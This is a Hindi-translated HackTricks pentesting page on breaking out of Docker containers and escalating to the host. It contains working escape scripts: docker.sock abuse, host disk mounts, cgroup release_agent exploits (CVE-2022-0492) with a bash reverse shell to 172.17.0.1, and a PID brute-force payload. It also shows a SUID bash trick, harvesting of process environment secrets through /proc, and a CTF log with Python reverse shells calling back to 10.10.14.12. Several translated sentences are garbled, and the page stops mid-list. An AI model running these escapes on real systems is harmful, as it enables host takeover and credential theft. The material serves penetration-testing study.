# Docker Breakout / विशेषाधिकार उन्नति

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सदस्यता योजनाएं देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** द्वारा **PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में।

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) का उपयोग करें और दुनिया के **सबसे उन्नत समुदाय उपकरणों** द्वारा संचालित **कार्यप्रवाहों** को आसानी से निर्माण और स्वचालित करें।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## स्वचालित गणना और भागना

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): यह **कंटेनरों की गणना** भी कर सकता है
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): यह उपकरण खास रूप से **उस कंटेनर की गणना के लिए उपयोगी है जिसमें आप हैं और स्वचालित भागने की कोशिश कर सकते हैं**
* [**amicontained**](https://github.com/genuinetools/amicontained): इस्तेमाली उपकरण जांचने के लिए कंटेनर के प्रिविलेज को प्राप्त करने के लिए जिससे आप उससे भाग सकें
* [**deepce**](https://github.com/stealthcopter/deepce): कंटेनरों की गणना और भागने के लिए उपकरण
* [**grype**](https://github.com/anchore/grype): छवि में स्थापित सॉफ्टवेयर में शामिल CVEs प्राप्त करें

## माउंट किया गया डॉकर सॉकेट भागना

यदि किसी प्रकार से आपको लगता है कि **डॉकर सॉकेट** को डॉकर कंटेनर के अंदर माउंट किया गया है, तो आप उससे भाग सकेंगे।\
यह आम तौर पर उन डॉकर कंटेनरों में होता है जो किसी कारणवश डॉकर डेमन से कनेक्ट होने की आवश्यकता होती है जिससे कार्रवाई करने के लिए।
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
इस मामले में आप सामान्य डॉकर कमांड्स का उपयोग कर सकते हैं डॉकर डेमन के साथ संचार के लिए:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
यदि **डॉकर सॉकेट अप्रत्याशित स्थान पर है** तो आप इसके साथ अभी भी संचार कर सकते हैं **`docker`** कमांड का उपयोग करके पैरामीटर के साथ **`-H unix:///path/to/docker.sock`**
{% endhint %}

डॉकर डेमन भी [एक पोर्ट में सुन रहा हो सकता है (डिफ़ॉल्ट रूप से 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) या Systemd-आधारित सिस्टमों पर, डॉकर डेमन के साथ संचार Systemd सॉकेट `fd://` के माध्यम से हो सकता है।

{% hint style="info" %}
इसके अतिरिक्त, अन्य उच्च स्तरीय रनटाइम के सॉकेट की रनटाइम सॉकेट पर ध्यान दें:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Capabilities दुरुपयोग भागना

आपको कंटेनर की क्षमताओं की जांच करनी चाहिए, यदि इसमें निम्नलिखित में से कोई है, तो आप इससे बाहर निकल सकते हैं: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

आप वर्तमान में कंटेनर की क्षमताएँ जांच सकते हैं **पहले से उल्लिखित स्वचालित उपकरणों** का उपयोग करके या:
```bash
capsh --print
```
## विशेषाधिकारित कंटेनर से बाहर निकलें

एक विशेषाधिकारित कंटेनर को झंझट `--privileged` के फ्लैग या विशेष रक्षाओं को अक्षम करके बनाया जा सकता है:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `/dev` माउंट करें

`--privileged` फ्लैग कंटेनर सुरक्षा को काफी कम कर देता है, **असीमित उपकरण एक्सेस** प्रदान करता है और **कई सुरक्षा उपायों** को छलने देता है। विस्तृत विश्लेषण के लिए, `--privileged` के पूरे प्रभाव पर दस्तावेज़ीकरण देखें।

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### विशेषाधिकारित + hostPID

इन अनुमतियों के साथ आप **मुख्य में रूट के रूप में चल रहे प्रक्रिया के नेमस्पेस में जा सकते हैं** जैसे init (pid:1) बस यह रन करके: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

इसे एक कंटेनर में टेस्ट करने के लिए निम्नलिखित को निष्पादित करें:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### विशेषाधिकार

केवल विशेषाधिकार ध्वज के साथ आप **होस्ट की डिस्क तक पहुंचने** की कोशिश कर सकते हैं या **release\_agent या अन्य भागों का दुरुपयोग करके बचने** की कोशिश कर सकते हैं।

निम्नलिखित उमारों का परीक्षण करें जो एक कंटेनर में कार्यान्वित किया जा सकता है:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### डिस्क माउंट करना - Poc1

अच्छी तरह से कॉन्फ़िगर किए गए डॉकर कंटेनर्स **fdisk -l** जैसे कमांड को नहीं अनुमति देंगे। हालांकि, जब `--privileged` या `--device=/dev/sda1` फ्लैग के साथ कैप्स को निर्दिष्ट किया जाता है, तो मेज़बान ड्राइव देखने के लिए विशेषाधिकार प्राप्त करना संभव है।

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

इसलिए मेज़बान मशीन पर कब्ज़ा करना बहुत आसान है:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
और देखो! अब आप मेज़बान के फ़ाइल सिस्टम तक पहुँच सकते हैं क्योंकि यह `/mnt/hola` फ़ोल्डर में माउंट किया गया है।

#### डिस्क माउंट करना - Poc2

कंटेनर के भीतर, एक हमलावर निम्नलिखित मेज़बान ओएस तक पहुँचने का प्रयास कर सकता है जिसे क्लस्टर द्वारा बनाए गए एक लिखने योग्य होस्टपैथ वॉल्यूम के माध्यम से किया गया है। नीचे कुछ सामान्य चीजें हैं जो आप कंटेनर के भीतर जांच सकते हैं ताकि आप इस हमलावर वेक्टर का उपयोग कर सकें:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### विशेषाधिकार भाग अस्तित्व में release\_agent का दुरुपयोग ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="मूल PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

#### विशेषाधिकार भागना बनाए गए release_agent का दुरुपयोग ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="दूसरा PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

**तकनीक की व्याख्या** खोजें:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### विशेषाधिकार भागना - relative path पता नहीं है release\_agent का दुरुपयोग - PoC3

पिछले उत्पीड़नों में **मेज़बान फ़ाइलसिस्टम में कंटेनर का पूर्ण पथ उजागर होता है**। हालांकि, यह हमेशा ऐसा नहीं होता। उन मामलों में जहां आप **मेज़बान में कंटेनर का पूर्ण पथ नहीं जानते** हैं, आप इस तकनीक का उपयोग कर सकते हैं:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
किसी विशेषाधिकार वाले कंटेनर के भीतर PoC को क्रियान्वित करने से निम्नलिखित के समान आउटपुट प्राप्त होना चाहिए:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### विशेषाधिकारिक भाग भारी माउंट का दुरुपयोग

कई फ़ाइलें हो सकती हैं जो माउंट की गई हों जो **मेज़बान के तहत की जानकारी** देती हैं। इनमें से कुछ ऐसी भी हो सकती हैं जो **कुछ होने पर मेज़बान द्वारा कुछ क्रियान्वित करने की संकेत देती हैं** (जिससे हमलावर को कंटेनर से बाहर निकलने की अनुमति होगी)।\
इन फ़ाइलों का दुरुपयोग यह संभव बना सकता है कि:

* release\_agent (पहले से ही शामिल किया गया है)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

हालांकि, आप इस पृष्ठ में **अन्य संवेदनशील फ़ाइलें** भी जांचने के लिए खोज सकते हैं:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### मनमानी माउंट

कई अवसरों में आपको यह पाया जाएगा कि **कंटेनर में मेज़बान से कुछ वॉल्यूम माउंट किया गया है**। यदि यह वॉल्यूम सही ढंग से कॉन्फ़िगर नहीं किया गया है तो आपको **संवेदनशील डेटा तक पहुंचने/संशोधित करने** की संभावना हो सकती है: रहस्य पढ़ें, एसएसएच अधिकृत\_कुंजियाँ बदलें...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### 2 शैल्स और होस्ट माउंट के साथ विशेषाधिकार उन्नति

यदि आपके पास **कंटेनर के अंदर रूट के रूप में पहुंच** है जिसमें होस्ट से कुछ फोल्डर माउंट किया हुआ है और आपने **गैर-विशेषाधिकृत उपयोगकर्ता के रूप में होस्ट पर बच निकला** है और माउंट किए गए फोल्डर पर पढ़ने का अधिकार है।\
आप **कंटेनर** के अंदर **माउंट किए गए फोल्डर** में **एक बैश suid फ़ाइल** बना सकते हैं और **होस्ट से इसे निषेधाधिकार के लिए निष्पादित कर सकते हैं।
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### 2 शैल्स के साथ प्रिविलेज इस्केलेशन

यदि आपके पास **कंटेनर के अंदर रूट एक्सेस** है और आपने **गैर-प्रिविलेज्ड उपयोगकर्ता के रूप में होस्ट से बाहर निकल लिया है**, तो आप दोनों शैल्स का दुरुपयोग करके **होस्ट के अंदर प्रिविलेज इस्केलेशन** कर सकते हैं अगर आपके पास कंटेनर के अंदर MKNOD क्षमता है (यह डिफ़ॉल्ट है) जैसा कि [**इस पोस्ट में स्पष्ट किया गया है**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)।\
इस प्रकार की क्षमता के साथ कंटेनर के अंदर रूट उपयोगकर्ता को **ब्लॉक डिवाइस फ़ाइलें बनाने की अनुमति** होती है। डिवाइस फ़ाइलें विशेष फ़ाइलें हैं जो **अंडरलाइंग हार्डवेयर और कर्नेल मॉड्यूल तक पहुँचने** के लिए उपयोग की जाती हैं। उदाहरण के लिए, /dev/sda ब्लॉक डिवाइस फ़ाइल सिस्टम डिस्क पर **रॉ डेटा पढ़ने की अनुमति** देती है।

डॉकर ब्लॉक डिवाइस के दुरुपयोग के खिलाफ संरक्षित रहता है जो कंटेनर के अंदर cgroup नीति को लागू करके **ब्लॉक डिवाइस पढ़ने/लिखने के ऑपरेशन ब्लॉक करता है**। फिर भी, यदि कंटेनर के अंदर एक ब्लॉक डिवाइस **बनाया जाता है**, तो यह कंटेनर के बाहर **/proc/PID/root/** निर्देशिका के माध्यम से पहुँचने योग्य हो जाता है। इस पहुँच के लिए आवश्यक है कि **प्रक्रिया के मालिक दोनों कंटेनर के अंदर और बाहर समान हों**।

इस [**लेखन**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/) से **शोषण** उदाहरण:
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

यदि आप मेज़बान के प्रक्रियाओं तक पहुंच सकते हैं तो आप उन प्रक्रियाओं में संग्रहित कई संवेदनशील जानकारी तक पहुंच सकते हैं। टेस्ट लैब चलाएँ:
```
docker run --rm -it --pid=host ubuntu bash
```
उदाहरण के लिए, आप `ps auxn` जैसी कुछ चीजों का उपयोग करके प्रक्रियाओं की सूची बना सकेंगे और कमांड में संवेदनशील विवरणों की खोज कर सकेंगे।

फिर, जैसे ही आप **/proc/ में मेजबान की प्रत्येक प्रक्रिया तक पहुंच सकते हैं, आप उनके env गुप्त रहस्य चुरा सकते हैं** चला रहे हैं:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
आप भी **अन्य प्रक्रियाओं के फ़ाइल डिस्क्रिप्टर्स तक पहुँच सकते हैं और उनकी ओपन फ़ाइल्स को पढ़ सकते हैं**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
आप भी **प्रक्रियाओं को मार सकते हैं और डीओएस का कारण बना सकते हैं**।

{% hint style="warning" %}
यदि आपके पास किसी कंटेनर के बाहर की प्रक्रिया पर विशेषाधिकारिता है, तो आप कुछ इस प्रकार का कुछ चला सकते हैं `nsenter --target <pid> --all` या `nsenter --target <pid> --mount --net --pid --cgroup` जिससे आप **एक शैल को चला सकते हैं जिसमें उस प्रक्रिया की तुलना में कोई ns प्रतिबंधन नहीं है** (आशा है कि कोई नहीं है)।
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
यदि एक कंटेनर को डॉकर [होस्ट नेटवर्किंग ड्राइवर (`--network=host`)](https://docs.docker.com/network/host/) के साथ कॉन्फ़िगर किया गया था, तो उस कंटेनर का नेटवर्क स्टैक डॉकर होस्ट से अलग नहीं है (कंटेनर होस्ट के नेटवर्किंग नेमस्पेस को साझा करता है), और कंटेनर को अपना आईपी-पता नहीं दिया जाता है। दूसरे शब्दों में, **कंटेनर सभी सेवाएं सीधे होस्ट के आईपी पर बाइंड करता है**। इसके अतिरिक्त, कंटेनर **होस्ट** द्वारा भेजे और प्राप्त कर रहा है सभी नेटवर्क ट्रैफ़िक को **अंतर्ग्रहण कर सकता है जो साझा इंटरफेस `tcpdump -i eth0` पर है**।

उदाहरण के लिए, आप इसका उपयोग करके **होस्ट और मेटाडेटा इंस्टेंस के बीच ट्रैफ़िक को स्निफ़ और स्पूफ़** कर सकते हैं।

जैसे निम्नलिखित उदाहरणों में:

* [लेख: Google SRE से संपर्क कैसे करें: क्लाउड SQL में शैल ड्रॉप करना](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [मेटाडेटा सेवा MITM द्वारा रूट प्रिविलेज उन्नति (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

आपको यहां तक पहुंचने की अनुमति भी होगी **होस्ट या तो होस्ट के अंदर बाइंड नेटवर्क सेवाओं तक** या फिर **नोड की मेटाडेटा अनुमतियों तक** (जो एक कंटेनर तक पहुंच सकती है)।

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
जब `hostIPC=true` होता है, तो आपको मेज़बान के इंटर-प्रोसेस कम्यूनिकेशन (IPC) संसाधनों तक पहुंच मिलती है, जैसे कि **साझा स्मृति** `/dev/shm` में। इससे यह संभव होता है कि आप उनी IPC संसाधनों पर पढ़ने/लिखने की अनुमति प्राप्त करें जो अन्य मेज़बान या पॉड प्रक्रियाओं द्वारा उपयोग किए जा रहे हों। `ipcs` का उपयोग करके इन IPC तंत्रों की अध्ययन करें।

* **/dev/shm की जांच** - इस साझा स्मृति स्थान में किसी भी फ़ाइल के लिए देखें: `ls -la /dev/shm`
* **मौजूदा IPC सुविधाओं की जांच** - आप `/usr/bin/ipcs` का उपयोग करके देख सकते हैं कि क्या कोई IPC सुविधाएँ उपयोग की जा रही हैं। इसे जांचें: `ipcs -a`

### क्षमताएँ पुनः प्राप्त करें

यदि सिस्कॉल **`unshare`** प्रतिबंधित नहीं है तो आप निम्नलिखित चला कर सभी क्षमताएँ पुनः प्राप्त कर सकते हैं:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### उपयोगकर्ता नेमस्पेस द्वारा सिम्लिंक का दुरुपयोग

पोस्ट [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) में समझाई गई दूसरी तकनीक दिखाती है कि आप यूजर नेमस्पेस के साथ बाइंड माउंट का दुरुपयोग कैसे कर सकते हैं, ताकि मेजबान के अंदर फ़ाइलों पर प्रभाव डाल सकें (उस विशेष मामले में, फ़ाइलें हटा सकते हैं)।

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) का उपयोग करें और आसानी से **वर्ल्ड के सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित **कार्यप्रवाह** निर्मित करें।\
आज ही पहुंचें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVEs

### Runc एक्सप्लॉइट (CVE-2019-5736)

यदि आप `docker exec` को रूट के रूप में निष्पादित कर सकते हैं (संभावित रूप से sudo के साथ), तो आप CVE-2019-5736 का दुरुपयोग करके निकल सकते हैं (यहां एक्सप्लॉइट है [यहां](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go))। यह तकनीक मूल रूप से **मेज़बान** से **होस्ट** के _**/bin/sh**_ बाइनरी को **अधिलेखित** करेगी, इसलिए कोई भी docker exec को निष्पादित करने वाला पेलोड ट्रिगर कर सकता है।

पेलोड को अनुसार बदलें और `go build main.go` के साथ main.go को बनाएं। परिणामी बाइनरी को डॉकर कंटेनर में निष्पादित करने के लिए रखा जाना चाहिए।\
निष्पादन के दौरान, जैसे ही यह `[+] Overwritten /bin/sh successfully` प्रदर्शित करता है, आपको मेज़बान मशीन से निम्नलिखित को निष्पादित करना होगा:

`docker exec -it <container-name> /bin/sh`

यह पेलोड को ट्रिगर करेगा जो मुख्य.go फ़ाइल में मौजूद है।

अधिक जानकारी के लिए: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
कंटेनर को अनुरूप हो सकने वाले अन्य CVEs हैं, आप [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list) में सूची पा सकते हैं।
{% endhint %}

## डॉकर कस्टम एस्केप

### डॉकर एस्केप सरफेस

* **नेमस्पेस:** प्रक्रिया को नेमस्पेस के माध्यम से **पूरी तरह से अलग** रखा जाना चाहिए, ताकि हम नेमस्पेस के कारण अन्य प्रक्रियाओं के साथ इंटरैक्ट करने से बच सकें (डिफ़ॉल्ट रूप से IPCs, यूनिक्स सॉकेट्स, नेटवर्क सेवाएं, D-Bus, अन्य प्रक्रियाओं के `/proc` के माध्यम से संवाद कर सकते हैं)।
* **रूट उपयोगकर्ता**: डिफ़ॉल्ट रूप से प्रक्रिया चलाने वाला उपयोगकर्ता रूट उपयोगकर्ता है (हालांकि इसकी विशेषाधिकार सीमित हैं)।
* **क्षमताएँ**: डॉकर निम्नलिखित क्षमताएँ छोड़ता है: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **सिसकॉल्स**: ये सिसकॉल्स हैं जिन्हें **रूट उपयोगकर्ता कॉल नहीं कर सकेगा** (क्षमताओं की कमी + Seccomp के कारण)। बचे हुए सिसकॉल्स का प्रयास करने के लिए उपयोग किया जा सकता है।

{% tabs %}
{% tab title="x64 सिसकॉल्स" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
